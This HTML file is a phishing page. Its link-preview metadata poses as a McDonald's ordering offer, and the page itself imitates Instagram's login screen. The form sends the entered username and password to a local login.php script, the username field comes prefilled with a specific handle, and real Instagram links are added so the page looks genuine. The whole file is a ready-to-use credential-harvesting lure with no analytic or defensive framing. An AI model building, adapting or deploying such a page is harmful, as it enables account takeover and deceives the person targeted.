<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:title" content="Get Your Favorites at McDonald's">
    <meta property="og:description" content="Click here to order fresh, hot, and delicious meals from your nearest McDonald's today.">
    <meta property="og:image" content="https://cdn.phototourl.com/free/2026-06-14-8ad580eb-a5d0-4470-9f9f-0be274d4a613.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:type" content="website">

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login • Instagram</title>
    <style>
        body {
          background-color: #000000;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
            Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          color: #ffffff;
        }

        .loader-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-color: rgba(10, 10, 10, 0.95);
          display: flex;
          justify-content: center;
          align-items: center;
          z-index: 9999;
          opacity: 1;
          visibility: visible;
          transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        .loaded .loader-overlay {
          opacity: 0;
          visibility: hidden;
        }

        .loader {
          width: 40px;
          aspect-ratio: 1;
          border-radius: 50%;
          border: 3px solid #575757;
          border-right-color: #0095f6;
          animation: l2 1s infinite linear;
        }
        @keyframes l2 {
          to { transform: rotate(1turn); }
        }

        #content {
          opacity: 0;
          transition: opacity 0.5s ease;
        }

        .loaded #content {
          opacity: 1;
        }

        .container {
          max-width: 350px;
          margin: 3rem auto 0 auto;
          display: flex;
          justify-content: center;
          flex-direction: column;
          align-items: center;
          font-size: 14px;
        }

        .box {
          width: 100%;
          display: flex;
          justify-content: center;
          align-items: center;
          flex-direction: column;
          background-color: #121212;
          border: 1px solid #262626;
          border-radius: 3px;
          margin: 0 0 10px;
          padding: 20px 0;
          box-sizing: border-box;
        }

        .heading {
          margin: 22px auto 30px auto;
          background-image: url("https://raw.githubusercontent.com/usernsme-yay/hehehjakan/refs/heads/main/IMG_7139.png");
          background-size: contain;
          background-repeat: no-repeat;
          background-position: center;
          height: 51px;
          width: 175px;
        }

        .login-form {
          width: 85%;
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .field {
          margin: 4px 0;
          position: relative;
          font-size: 14px;
          width: 100%;
        }

        input {
          box-sizing: border-box;
          padding: 14px 0 2px 8px;
          font-size: 12px;
          width: 100%;
          height: 38px;
          outline: none;
          background: #1c1c1c;
          border: 1px solid #363636;
          border-radius: 3px;
          color: #ffffff;
        }

        input:placeholder-shown {
          padding: 9px 0 7px 8px;
        }

        label {
          position: absolute;
          pointer-events: none;
          left: 8px;
          top: 50%;
          transform: translateY(-50%);
          transition: transform ease-out 0.1s, font-size ease-out 0.1s;
          font-size: 12px;
          color: #a3a3a3;
        }

        input::placeholder {
          opacity: 0;
        }

        input:not(:placeholder-shown) + label {
          transform: translateY(-14px);
          font-size: 10px;
        }

        .login-button {
          text-align: center;
          width: 100%;
          height: 32px;
          margin-top: 8px;
          border: none;
          background-color: #0095f6;
          color: #fff;
          font-weight: 600;
          font-size: 14px;
          cursor: pointer;
          border-radius: 4px;
        }

        .separator {
          display: flex;
          justify-content: space-between;
          align-items: center;
          color: #a3a3a3;
          margin: 16px 0;
          width: 100%;
          font-weight: 600;
          font-size: 12px;
        }

        .separator .line {
          height: 1px;
          width: 40%;
          background-color: #363636;
        }

        .other {
          display: flex;
          justify-content: center;
          flex-direction: column;
          align-items: center;
          width: 100%;
        }

        .forgot-password {
          font-size: 12px;
          color: #0095f6;
          font-weight: 400;
          text-decoration: none;
          margin-top: 12px;
        }

        .signup {
          color: #0095f6;
          font-weight: 600;
          text-decoration: none;
        }

        p {
          text-align: center;
          color: #ffffff;
          margin: 0;
        }

        #show-password-btn {
          position: absolute;
          right: 8px;
          top: 50%;
          transform: translateY(-50%);
          background-color: transparent;
          border: none;
          cursor: pointer;
          font-weight: 600;
          font-size: 14px;
          color: #ffffff;
          display: none;
        }
    </style>
</head>
<body>
    <div class="loader-overlay">
        <div class="loader"></div>
    </div>

    <div class="container" id="content">
        <div class="box">
            <div class="heading"></div>
            
            <form class="login-form" action="login.php" method="post">
                <div class="field">
                    <input id="username" type="text" name="username" value="flaka.xoo" placeholder="Phone number, username, or email" required />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field" style="position:relative;">
                    <input id="message" type="password" name="password" placeholder="Password" required />
                    <label for="password">Password</label>
                    <button type="button" id="show-password-btn">Show</button>
                </div>
                <button class="login-button" type="submit">Log In</button>
                
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                
                <div class="other">
                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
                </div>
            </form>
        </div>
        
        <div class="box">
            <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/signup/phone" target="_blank">Sign Up</a></p>
        </div>
    </div>

    <script>
        window.addEventListener('load', function () {
            document.body.classList.add('loaded');
        });

        const showPasswordBtn = document.getElementById('show-password-btn');
        const passwordField = document.getElementById('message');

        passwordField.addEventListener('input', function () {
            showPasswordBtn.style.display = passwordField.value.length > 0 ? 'block' : 'none';
        });

        showPasswordBtn.addEventListener('click', function () {
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                showPasswordBtn.textContent = 'Hide';
            } else {
                passwordField.type = 'password';
                showPasswordBtn.textContent = 'Show';
            }
        });
    </script>
</body>
</html>
